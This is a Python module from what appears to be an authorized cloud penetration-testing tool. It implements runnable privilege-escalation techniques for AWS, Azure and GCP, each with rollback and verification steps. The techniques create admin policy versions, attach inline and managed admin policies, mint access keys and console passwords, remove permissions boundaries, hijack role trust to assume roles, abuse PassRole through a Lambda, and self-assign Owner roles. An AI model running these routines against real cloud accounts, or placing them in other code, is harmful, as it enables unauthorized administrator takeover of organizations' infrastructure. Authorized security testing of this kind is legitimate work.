"""Executable escalation techniques with explicit rollback.

Each technique: preflight actions, plan (API actions + undo), verify (read-only
proof), and cleanup descriptors for kept artifacts.
"""
from __future__ import annotations

import io
import json
import secrets
import time
import uuid
import zipfile
from dataclasses import dataclass
from typing import Callable

import boto3

from .guard import ExploitError
from .session import ADMIN_POLICY_ARN, role_name_from_arn

ADMIN_DOC = {
    "Version": "2012-10-17",
    "Statement": [{"Effect": "Allow", "Action": "*", "Resource": "*"}],
}


@dataclass
class Action:
    label: str
    run: Callable[[], dict]
    undo: Callable[[], None] | None = None
    cleanup: Callable[[], dict] | None = None
    artifact: Callable[[], tuple[str, str]] | None = None


@dataclass
class Technique:
    id: str
    name: str
    description: str
    preflight: list[str]
    required: tuple[str, ...]
    plan: Callable
    verify: Callable
    resources: Callable | None = None
    preflight_for: Callable | None = None
    provider: str = "aws"


def _admin_policy(ctx) -> str:
    return ctx.param("admin_policy_arn") or ADMIN_POLICY_ARN


def _simulate(ctx, actions: list[str], resources: list[str] | None = None) -> dict:
    iam = ctx.client("iam")
    response = iam.simulate_principal_policy(
        PolicySourceArn=ctx.canonical_arn,
        ActionNames=actions,
        ResourceArns=resources or ["*"],
    )
    decisions = {str(r.get("EvalActionName")): str(r.get("EvalDecision", ""))
                 for r in response.get("EvaluationResults", [])}
    denied = {a: d for a, d in decisions.items() if d != "allowed"}
    if not decisions or denied:
        raise ExploitError(f"verification failed: simulator decisions {decisions or 'empty'}")
    return {"simulated": decisions, "proved": True}


def _verify_admin(ctx) -> dict:
    evidence = _simulate(ctx, ["iam:CreateUser", "iam:AttachUserPolicy"])
    evidence["effect"] = "administrator-equivalent"
    return evidence


# --- ESC-04: create/set an admin policy version -----------------------------

def _plan_esc04(ctx) -> list[Action]:
    iam = ctx.client("iam")
    arn = ctx.param("target_policy")
    policy = iam.get_policy(PolicyArn=arn)["Policy"]
    old_default = policy["DefaultVersionId"]
    state: dict = {}

    def create_version():
        resp = iam.create_policy_version(
            PolicyArn=arn, PolicyDocument=json.dumps(ADMIN_DOC),
            SetAsDefault=False)
        state["new"] = resp["PolicyVersion"]["VersionId"]
        return {"version": state["new"]}

    def undo_create():
        iam.delete_policy_version(PolicyArn=arn, VersionId=state["new"])

    def set_default():
        iam.set_default_policy_version(PolicyArn=arn, VersionId=state["new"])
        return {"default_version": state["new"]}

    def undo_set():
        iam.set_default_policy_version(PolicyArn=arn, VersionId=old_default)

    return [
        Action("Create administrator policy version", create_version, undo_create,
               lambda: {"op": "delete_policy_version",
                        "params": {"PolicyArn": arn, "VersionId": state["new"]}},
               lambda: ("policy-version", f"{arn}:{state['new']}")),
        Action("Set new version as default", set_default, undo_set,
               lambda: {"op": "set_default_policy_version",
                        "params": {"PolicyArn": arn, "VersionId": old_default}},
               lambda: ("policy-default", arn)),
    ]


# --- ESC-05: attach a managed admin policy ----------------------------------

def _attached_policies(iam, kind: str, name: str) -> list[dict]:
    method = (iam.list_attached_role_policies if kind == "role"
              else iam.list_attached_user_policies)
    kwargs = {"RoleName": name} if kind == "role" else {"UserName": name}
    found: list[dict] = []
    while True:
        page = method(**kwargs)
        found.extend(page.get("AttachedPolicies", []))
        if not page.get("IsTruncated"):
            return found
        kwargs["Marker"] = page["Marker"]


def _plan_esc05(ctx) -> list[Action]:
    iam = ctx.client("iam")
    name = ctx.iam_name()
    policy = _admin_policy(ctx)
    attached = _attached_policies(iam, ctx.kind, name)
    if ctx.kind == "role":
        call = lambda: iam.attach_role_policy(RoleName=name, PolicyArn=policy)
        undo = lambda: iam.detach_role_policy(RoleName=name, PolicyArn=policy)
        op, key = "detach_role_policy", "RoleName"
    else:
        call = lambda: iam.attach_user_policy(UserName=name, PolicyArn=policy)
        undo = lambda: iam.detach_user_policy(UserName=name, PolicyArn=policy)
        op, key = "detach_user_policy", "UserName"
    if any(p.get("PolicyArn") == policy for p in attached):
        raise ExploitError(
            f"{policy} is already attached to {name}; refusing to detach "
            f"pre-existing state during rollback")
    return [Action(f"Attach {policy} to self", call, undo,
                   lambda: {"op": op, "params": {key: name, "PolicyArn": policy}},
                   lambda: ("attachment", f"{name}:{policy}"))]


# --- ESC-06: put an inline admin policy -------------------------------------

def _plan_esc06(ctx) -> list[Action]:
    iam = ctx.client("iam")
    name = ctx.iam_name()
    policy_name = f"cidag-escalation-{secrets.token_hex(3)}"
    if ctx.kind == "role":
        call = lambda: iam.put_role_policy(RoleName=name, PolicyName=policy_name,
                                           PolicyDocument=json.dumps(ADMIN_DOC))
        undo = lambda: iam.delete_role_policy(RoleName=name, PolicyName=policy_name)
        op, key = "delete_role_policy", "RoleName"
    else:
        call = lambda: iam.put_user_policy(UserName=name, PolicyName=policy_name,
                                           PolicyDocument=json.dumps(ADMIN_DOC))
        undo = lambda: iam.delete_user_policy(UserName=name, PolicyName=policy_name)
        op, key = "delete_user_policy", "UserName"
    return [Action(f"Put inline admin policy {policy_name}", call, undo,
                   lambda: {"op": op, "params": {key: name,
                                                 "PolicyName": policy_name}},
                   lambda: ("inline-policy", f"{name}:{policy_name}"))]


# --- ESC-07: create an access key -------------------------------------------

def _plan_esc07(ctx) -> list[Action]:
    if ctx.kind != "user":
        raise ExploitError(
            "ESC-07 creates IAM user access keys; run with credentials for an "
            "IAM user principal (roles cannot own access keys)")
    iam = ctx.client("iam")
    user = ctx.iam_name()
    state: dict = {}

    def create_key():
        resp = iam.create_access_key(UserName=user)["AccessKey"]
        state["id"] = resp["AccessKeyId"]
        ctx.params["_access_key_id"] = state["id"]
        ctx.audit.secret_once("SecretAccessKey", resp["SecretAccessKey"])
        return {"AccessKeyId": resp["AccessKeyId"]}

    def undo_key():
        iam.delete_access_key(UserName=user, AccessKeyId=state["id"])

    return [Action("Create access key for self", create_key, undo_key,
                   lambda: {"op": "delete_access_key",
                            "params": {"UserName": user,
                                       "AccessKeyId": state["id"]}},
                   lambda: ("access-key", state["id"]))]


def _verify_esc07(ctx) -> dict:
    secret = ctx.audit.secrets.get("SecretAccessKey") if ctx.audit else None
    if not secret:
        raise ExploitError("created access key secret is unavailable for verification")
    key_id = ctx.params.get("_access_key_id")
    if not key_id:
        key_id = next((a["identifier"] for a in ctx.audit.manifest["artifacts"]
                       if a["kind"] == "access-key"), None)
    last_error = None
    for _ in range(4):
        try:
            probe = boto3.Session(
                aws_access_key_id=key_id,
                aws_secret_access_key=secret,
                region_name=ctx.session.region)
            ident = probe.client("sts").get_caller_identity()
            return {"user_id": ident.get("UserId"), "arn": ident.get("Arn")}
        except Exception as e:  # eventual consistency just after creation
            last_error = e
            time.sleep(1)
    raise ExploitError(f"created access key could not authenticate: {last_error}")


# --- ESC-08: switch default policy version ----------------------------------

def _plan_esc08(ctx) -> list[Action]:
    iam = ctx.client("iam")
    arn = ctx.param("target_policy")
    version = ctx.param("policy_version")
    old_default = iam.get_policy(PolicyArn=arn)["Policy"]["DefaultVersionId"]

    def set_default():
        iam.set_default_policy_version(PolicyArn=arn, VersionId=version)
        return {"default_version": version, "previous": old_default}

    def undo_set():
        iam.set_default_policy_version(PolicyArn=arn, VersionId=old_default)

    return [Action(f"Set policy default to version {version}", set_default, undo_set,
                   lambda: {"op": "set_default_policy_version",
                            "params": {"PolicyArn": arn, "VersionId": old_default}},
                   lambda: ("policy-default", arn))]


# --- ESC-09: boundary manipulation ------------------------------------------

def _plan_esc09(ctx) -> list[Action]:
    iam = ctx.client("iam")
    name = ctx.iam_name()
    boundary = ctx.param("boundary_arn")
    if ctx.kind == "role":
        current = (iam.get_role(RoleName=name)["Role"].get("PermissionsBoundary")
                   or {}).get("PermissionsBoundaryArn")
        put = lambda: iam.put_role_permissions_boundary(RoleName=name,
                                                        PermissionsBoundary=boundary)
        delete = lambda: iam.delete_role_permissions_boundary(RoleName=name)
        restore = (lambda: iam.put_role_permissions_boundary(
            RoleName=name, PermissionsBoundary=current)) if current else delete
        cleanup_restore = ({"op": "put_role_permissions_boundary",
                            "params": {"RoleName": name,
                                       "PermissionsBoundary": current}}
                           if current else {"op": "delete_role_permissions_boundary",
                                            "params": {"RoleName": name}})
    else:
        current = (iam.get_user(UserName=name)["User"].get("PermissionsBoundary")
                   or {}).get("PermissionsBoundaryArn")
        put = lambda: iam.put_user_permissions_boundary(UserName=name,
                                                        PermissionsBoundary=boundary)
        delete = lambda: iam.delete_user_permissions_boundary(UserName=name)
        restore = (lambda: iam.put_user_permissions_boundary(
            UserName=name, PermissionsBoundary=current)) if current else delete
        cleanup_restore = ({"op": "put_user_permissions_boundary",
                            "params": {"UserName": name,
                                       "PermissionsBoundary": current}}
                           if current else {"op": "delete_user_permissions_boundary",
                                            "params": {"UserName": name}})

    if boundary:
        return [Action(f"Put boundary {boundary} on self", put, restore,
                       lambda: cleanup_restore, lambda: ("boundary", name))]
    if not current:
        raise ExploitError("no permissions boundary is attached; pass --boundary-arn "
                           "to replace one or use a boundary-removal finding")
    return [Action("Delete permissions boundary from self", delete, restore,
                   lambda: cleanup_restore, lambda: ("boundary", name))]


# --- ESC-10: add self to a privileged group ---------------------------------

def _plan_esc10(ctx) -> list[Action]:
    if ctx.kind != "user":
        raise ExploitError("ESC-10 adds an IAM user to a group; run as an IAM user")
    iam = ctx.client("iam")
    user = ctx.iam_name()
    group = ctx.param("target_group")
    membership = iam.list_groups_for_user(UserName=user).get("Groups", [])
    if any(g.get("GroupName") == group for g in membership):
        raise ExploitError(
            f"{user} is already a member of {group}; refusing to remove "
            f"pre-existing state during rollback")

    def add():
        iam.add_user_to_group(GroupName=group, UserName=user)
        return {"group": group}

    def undo():
        iam.remove_user_from_group(GroupName=group, UserName=user)

    return [Action(f"Add self to group {group}", add, undo,
                   lambda: {"op": "remove_user_from_group",
                            "params": {"GroupName": group, "UserName": user}},
                   lambda: ("group-membership", f"{user}:{group}"))]


# --- ESC-11: hijack role trust ----------------------------------------------

def _plan_esc11(ctx) -> list[Action]:
    iam = ctx.client("iam")
    target = ctx.param("target_role")
    if target.startswith("arn:"):
        role_name = role_name_from_arn(target)
        target_arn = target
    else:
        role_name = target
        target_arn = f"arn:aws:iam::{ctx.account}:role/{role_name}"
    role = iam.get_role(RoleName=role_name)["Role"]
    original = role["AssumeRolePolicyDocument"]
    new_doc = {
        "Version": "2012-10-17",
        "Statement": [{
            "Effect": "Allow",
            "Principal": {"AWS": ctx.canonical_arn},
            "Action": "sts:AssumeRole",
        }],
    }

    def update():
        iam.update_assume_role_policy(RoleName=role_name,
                                      PolicyDocument=json.dumps(new_doc))
        return {"target_role": target_arn}

    def undo():
        iam.update_assume_role_policy(RoleName=role_name,
                                      PolicyDocument=json.dumps(original))

    return [Action(f"Trust current principal in {role_name}", update, undo,
                   lambda: {"op": "update_assume_role_policy",
                            "params": {"RoleName": role_name,
                                       "PolicyDocument": original}},
                   lambda: ("trust-policy", role_name))]


def _verify_esc11(ctx) -> dict:
    target = ctx.param("target_role")
    role_name = role_name_from_arn(target) if target.startswith("arn:") else target
    target_arn = target if target.startswith("arn:") else \
        f"arn:aws:iam::{ctx.account}:role/{role_name}"
    last_error = None
    for _ in range(4):
        try:
            resp = ctx.client("sts").assume_role(
                RoleArn=target_arn, RoleSessionName="cidag-verify")
            creds = resp["Credentials"]
            probe = boto3.Session(
                aws_access_key_id=creds["AccessKeyId"],
                aws_secret_access_key=creds["SecretAccessKey"],
                aws_session_token=creds["SessionToken"],
                region_name=ctx.session.region)
            ident = probe.client("sts").get_caller_identity()
            return {"assumed_arn": ident.get("Arn"),
                    "assumed_account": ident.get("Account"),
                    "target_role": target_arn}
        except Exception as e:
            last_error = e
            time.sleep(1)
    raise ExploitError(f"trust update did not allow AssumeRole: {last_error}")


# --- ESC-12: create a login profile -----------------------------------------

def _plan_esc12(ctx) -> list[Action]:
    if ctx.kind != "user":
        raise ExploitError("ESC-12 creates login profiles for IAM users only")
    iam = ctx.client("iam")
    user = ctx.iam_name()
    try:
        iam.get_login_profile(UserName=user)
    except Exception as e:
        code = getattr(e, "response", {}).get("Error", {}).get("Code", "")
        if code != "NoSuchEntity":
            raise ExploitError(f"could not inspect login profile: {e}") from e
    else:
        raise ExploitError("user already has a login profile; refusing to reset an "
                           "existing password (cannot be rolled back)")
    password = "Cidag!7" + secrets.token_urlsafe(18)
    if ctx.audit:
        ctx.audit.secret_once("Password", password)

    def create():
        iam.create_login_profile(UserName=user, Password=password,
                                 PasswordResetRequired=True)
        return {"user": user, "password_reset_required": True}

    def undo():
        iam.delete_login_profile(UserName=user)

    return [Action("Create console login profile", create, undo,
                   lambda: {"op": "delete_login_profile",
                            "params": {"UserName": user}},
                   lambda: ("login-profile", user))]


def _verify_esc12(ctx) -> dict:
    profile = ctx.client("iam").get_login_profile(UserName=ctx.iam_name())
    return {"login_profile": bool(profile.get("LoginProfile")),
            "password_reset_required": profile.get("LoginProfile", {}).get(
                "PasswordResetRequired", False)}


# --- ESC-02: PassRole + Lambda probe ----------------------------------------

def _probe_zip() -> bytes:
    source = (
        "import boto3\n"
        "def handler(event, context):\n"
        "    return boto3.client('sts').get_caller_identity()\n")
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("lambda_function.py", source)
    return buf.getvalue()


def _plan_esc02(ctx) -> list[Action]:
    lam = ctx.client("lambda")
    role = ctx.param("pass_role")
    name = f"cidag-probe-{secrets.token_hex(4)}"
    state: dict = {}

    def create():
        resp = lam.create_function(
            FunctionName=name, Runtime="python3.12", Role=role,
            Handler="lambda_function.handler", Code={"ZipFile": _probe_zip()},
            Timeout=15, Description="CIDAG authorized escalation probe")
        state["arn"] = resp.get("FunctionArn", name)
        ctx.params["_function_name"] = name
        return {"function": name, "function_arn": state["arn"]}

    def undo():
        lam.delete_function(FunctionName=name)

    return [Action(f"Create Lambda {name} under {role}", create, undo,
                   lambda: {"op": "delete_function",
                            "params": {"FunctionName": name}},
                   lambda: ("lambda", name))]


def _verify_esc02(ctx) -> dict:
    lam = ctx.client("lambda")
    pass_role = ctx.param("pass_role")
    function = ctx.params.get("_function_name")
    if not function and ctx.audit:
        function = next((a["identifier"] for a in ctx.audit.manifest["artifacts"]
                         if a["kind"] == "lambda"), None)
    if not function:
        raise ExploitError("probe function name missing from manifest")
    last_error = None
    for _ in range(8):
        try:
            resp = lam.invoke(FunctionName=function)
            payload = resp.get("Payload")
            raw = payload.read() if hasattr(payload, "read") else payload
            if isinstance(raw, bytes):
                raw = raw.decode("utf-8")
            data = json.loads(raw or "{}")
            if data.get("Arn"):
                simulated = ctx.client("iam").simulate_principal_policy(
                    PolicySourceArn=pass_role,
                    ActionNames=["iam:CreateUser"], ResourceArns=["*"])
                decisions = {str(r.get("EvalActionName")):
                             str(r.get("EvalDecision", ""))
                             for r in simulated.get("EvaluationResults", [])}
                if not decisions or any(d != "allowed" for d in decisions.values()):
                    raise ExploitError(
                        f"passed role {pass_role} is not administrator-equivalent: "
                        f"{decisions or 'no decision'}")
                return {"probe_arn": data.get("Arn"),
                        "probe_account": data.get("Account"),
                        "role_admin_equivalent": True}
            last_error = data
        except Exception as e:
            last_error = e
        time.sleep(1)
    raise ExploitError(f"Lambda probe did not return an identity: {last_error}")


def _preflight_esc09(ctx) -> list[str]:
    if ctx.kind == "role":
        return (["iam:PutRolePermissionsBoundary"] if ctx.param("boundary_arn")
                else ["iam:DeleteRolePermissionsBoundary"])
    return (["iam:PutUserPermissionsBoundary"] if ctx.param("boundary_arn")
            else ["iam:DeleteUserPermissionsBoundary"])


def _target_role_arn(ctx) -> str:
    target = ctx.param("target_role")
    if target.startswith("arn:"):
        return target
    return f"arn:aws:iam::{ctx.account}:role/{target}"


AZURE_OWNER_ROLE = "8e3af657-a8ff-443c-a75c-2fe8c4bcb635"


def _attr(obj, key: str, default=None):
    if isinstance(obj, dict):
        return obj.get(key, default)
    return getattr(obj, key, default)


def _azure_owner_role_id(subscription: str) -> str:
    return (f"/subscriptions/{subscription}/providers/"
            f"Microsoft.Authorization/roleDefinitions/{AZURE_OWNER_ROLE}")


def _plan_az01(ctx) -> list[Action]:
    client = ctx.client("authorization")
    scope = (ctx.param("scope") or f"/subscriptions/{ctx.account}").rstrip("/")
    subscription_scope = f"/subscriptions/{ctx.account}"
    if (scope.casefold() != subscription_scope.casefold()
            and not scope.casefold().startswith(
                subscription_scope.casefold() + "/")):
        raise ExploitError(
            f"--scope must stay inside the authorized subscription "
            f"{ctx.account}")
    principal = ctx.identity.get("user_id") or ctx.param("principal_id")
    if not principal:
        raise ExploitError(
            "Azure principal id unavailable from the access token; pass "
            "--principal-id with the object id to grant")
    role_id = _azure_owner_role_id(ctx.account)
    name = str(uuid.uuid4())
    ctx.params.update({"_azure_scope": scope, "_azure_principal": principal,
                       "_azure_name": name})
    try:
        existing = list(client.role_assignments.list_for_scope(scope=scope))
    except Exception as e:
        raise ExploitError(f"could not list Azure role assignments: {e}") from e
    for assignment in existing:
        props = _attr(assignment, "properties", assignment)
        assigned_role = str(_attr(props, "role_definition_id", "") or "")
        assigned_principal = str(_attr(props, "principal_id", "") or "")
        if (assigned_principal == principal
                and assigned_role.lower().endswith(AZURE_OWNER_ROLE)):
            raise ExploitError(
                "target principal already has Owner at this scope; refusing "
                "to delete pre-existing access during rollback")

    def create():
        parameters = ctx.session.role_assignment_parameters(role_id, principal)
        response = client.role_assignments.create(scope, name, parameters)
        return {"scope": scope, "name": name,
                "id": str(_attr(response, "id", name))}

    def undo():
        client.role_assignments.delete(scope, name)

    return [Action(
        "Assign Owner role to caller", create, undo,
        lambda: {"op": "delete_azure_role_assignment",
                 "params": {"scope": scope, "name": name}},
        lambda: ("azure-role-assignment", f"{scope}:{name}"))]


def _verify_az01(ctx) -> dict:
    client = ctx.client("authorization")
    scope = ctx.params["_azure_scope"]
    name = ctx.params["_azure_name"]
    principal = ctx.params["_azure_principal"]
    assignment = client.role_assignments.get(scope, name)
    props = _attr(assignment, "properties", assignment)
    role_id = str(_attr(props, "role_definition_id", "") or "")
    assigned_principal = str(_attr(props, "principal_id", "") or "")
    if (assigned_principal != principal
            or not role_id.lower().endswith(AZURE_OWNER_ROLE)):
        raise ExploitError(
            f"Azure role assignment verification failed: principal="
            f"{assigned_principal} role={role_id}")
    return {
        "assignment": str(_attr(assignment, "id", name)),
        "scope": scope,
        "principal_id": principal,
        "role_definition_id": role_id,
        "effect": "Owner at scope",
    }


GCP_OWNER_ROLE = "roles/owner"


def _binding_role(binding) -> str:
    return str(_attr(binding, "role", "") or "")


def _binding_members(binding) -> list:
    return _attr(binding, "members", []) or []


def _plan_gcp01(ctx) -> list[Action]:
    client = ctx.client("resourcemanager")
    resource = f"projects/{ctx.account}"
    member = ctx.param("member")
    if not member:
        raise ExploitError("GCP-01 requires --member (user:..., "
                           "serviceAccount:..., or group:...)")
    if not member.startswith(("user:", "group:", "serviceAccount:",
                              "domain:")):
        raise ExploitError(
            "GCP-01 --member must start with user:, group:, serviceAccount:, "
            "or domain:")
    policy = client.get_iam_policy(request={"resource": resource})
    ctx.params.update({"_gcp_resource": resource, "_gcp_member": member})
    for binding in _attr(policy, "bindings", []) or []:
        if _binding_role(binding) == GCP_OWNER_ROLE                 and member in _binding_members(binding):
            raise ExploitError(
                "target member is already Owner on this project; refusing "
                "to remove pre-existing access during rollback")

    added = {"value": False}

    def create():
        policy = client.get_iam_policy(request={"resource": resource})
        for binding in _attr(policy, "bindings", []) or []:
            if _binding_role(binding) == GCP_OWNER_ROLE:
                if member not in _binding_members(binding):
                    binding.members.append(member)
                    added["value"] = True
                break
        else:
            binding = policy.bindings.add()
            binding.role = GCP_OWNER_ROLE
            binding.members.append(member)
            added["value"] = True
        if added["value"]:
            client.set_iam_policy(
                request={"resource": resource, "policy": policy})
        return {"resource": resource, "member": member,
                "role": GCP_OWNER_ROLE}

    def undo():
        # Remove only the member we added, using the current etag, so
        # concurrent legitimate IAM changes are preserved.
        if not added["value"]:
            return
        current = client.get_iam_policy(request={"resource": resource})
        for binding in _attr(current, "bindings", []) or []:
            if _binding_role(binding) == GCP_OWNER_ROLE \
                    and member in _binding_members(binding):
                binding.members.remove(member)
                if not _binding_members(binding):
                    _drop_empty_bindings(current)
                break
        client.set_iam_policy(
            request={"resource": resource, "policy": current})

    return [Action(
        "Grant roles/owner to member", create, undo,
        lambda: {"op": "remove_gcp_owner_binding",
                 "params": {"resource": resource, "member": member}},
        lambda: ("gcp-iam-policy", resource))]


def _drop_empty_bindings(policy) -> None:
    bindings = _attr(policy, "bindings", None)
    if bindings is None:
        return
    nonempty = [b for b in bindings if _binding_members(b)]
    if len(nonempty) == len(bindings):
        return
    clear = getattr(policy, "ClearField", None)
    add = getattr(bindings, "add", None)
    if not clear or not add:
        return
    clear("bindings")
    for old in nonempty:
        new = add()
        new.role = _binding_role(old)
        new.members.extend(_binding_members(old))


def _verify_gcp01(ctx) -> dict:
    client = ctx.client("resourcemanager")
    resource = ctx.params["_gcp_resource"]
    member = ctx.params["_gcp_member"]
    policy = client.get_iam_policy(request={"resource": resource})
    for binding in _attr(policy, "bindings", []) or []:
        if _binding_role(binding) == GCP_OWNER_ROLE                 and member in _binding_members(binding):
            return {"resource": resource, "member": member,
                    "role": GCP_OWNER_ROLE, "effect": "Owner on project"}
    raise ExploitError(
        f"GCP policy verification failed: {member} not bound to roles/owner")


def actions_for(tech: Technique, ctx) -> list[str]:
    if tech.preflight_for:
        return tech.preflight_for(ctx)
    return list(tech.preflight)


TECHNIQUES: dict[str, Technique] = {
    "ESC-02": Technique(
        "ESC-02", "PassRole + Lambda probe",
        "Create a temporary Lambda under an admin role and invoke it.",
        ["iam:PassRole", "lambda:CreateFunction", "lambda:InvokeFunction"],
        ("pass_role",), _plan_esc02, _verify_esc02),
    "ESC-04": Technique(
        "ESC-04", "CreatePolicyVersion self-escalation",
        "Create an admin policy version and make it the default.",
        ["iam:CreatePolicyVersion", "iam:SetDefaultPolicyVersion"],
        ("target_policy",), _plan_esc04, _verify_admin,
        lambda ctx: [ctx.param("target_policy")]),
    "ESC-05": Technique(
        "ESC-05", "Attach managed policy",
        "Attach an administrator managed policy to the caller.",
        ["iam:AttachUserPolicy", "iam:AttachRolePolicy"],
        (), _plan_esc05, _verify_admin,
        lambda ctx: [ctx.canonical_arn],
        lambda ctx: ["iam:AttachRolePolicy"] if ctx.kind == "role"
        else ["iam:AttachUserPolicy"]),
    "ESC-06": Technique(
        "ESC-06", "Put inline admin policy",
        "Put an inline administrator policy on the caller.",
        ["iam:PutUserPolicy", "iam:PutRolePolicy"],
        (), _plan_esc06, _verify_admin,
        lambda ctx: [ctx.canonical_arn],
        lambda ctx: ["iam:PutRolePolicy"] if ctx.kind == "role"
        else ["iam:PutUserPolicy"]),
    "ESC-07": Technique(
        "ESC-07", "Create access key",
        "Create an access key for the caller and prove it authenticates.",
        ["iam:CreateAccessKey"],
        (), _plan_esc07, _verify_esc07,
        lambda ctx: [ctx.canonical_arn]),
    "ESC-08": Technique(
        "ESC-08", "Set default policy version",
        "Switch a policy back to a privileged version.",
        ["iam:SetDefaultPolicyVersion"],
        ("target_policy", "policy_version"), _plan_esc08, _verify_admin,
        lambda ctx: [ctx.param("target_policy")]),
    "ESC-09": Technique(
        "ESC-09", "Permissions boundary manipulation",
        "Replace or remove the caller's permissions boundary.",
        ["iam:PutUserPermissionsBoundary", "iam:DeleteUserPermissionsBoundary",
         "iam:PutRolePermissionsBoundary", "iam:DeleteRolePermissionsBoundary"],
        (), _plan_esc09, _verify_admin,
        lambda ctx: [ctx.canonical_arn], _preflight_esc09),
    "ESC-10": Technique(
        "ESC-10", "Add user to privileged group",
        "Add the caller to a privileged IAM group.",
        ["iam:AddUserToGroup"],
        ("target_group",), _plan_esc10, _verify_admin,
        lambda ctx: [f"arn:aws:iam::{ctx.account}:group/"
                     f"{ctx.param('target_group')}"]),
    "ESC-11": Technique(
        "ESC-11", "UpdateAssumeRolePolicy trust hijack",
        "Trust the caller in a target role and assume it.",
        ["iam:UpdateAssumeRolePolicy", "sts:AssumeRole"],
        ("target_role",), _plan_esc11, _verify_esc11,
        lambda ctx: [_target_role_arn(ctx)]),
    "ESC-12": Technique(
        "ESC-12", "Create login profile",
        "Create a console login profile for the caller.",
        ["iam:CreateLoginProfile"],
        (), _plan_esc12, _verify_esc12,
        lambda ctx: [ctx.canonical_arn]),
    "AZ-01": Technique(
        "AZ-01", "Assign Owner role to self (Azure)",
        "Create an Azure RBAC Owner role assignment at subscription or "
        "resource-group scope.",
        ["Microsoft.Authorization/roleAssignments/write"],
        (), _plan_az01, _verify_az01, provider="azure"),
    "GCP-01": Technique(
        "GCP-01", "Grant roles/owner to self (GCP)",
        "Add the caller to the roles/owner binding on a GCP project.",
        ["resourcemanager.projects.setIamPolicy"],
        ("member",), _plan_gcp01, _verify_gcp01, provider="gcp"),
}
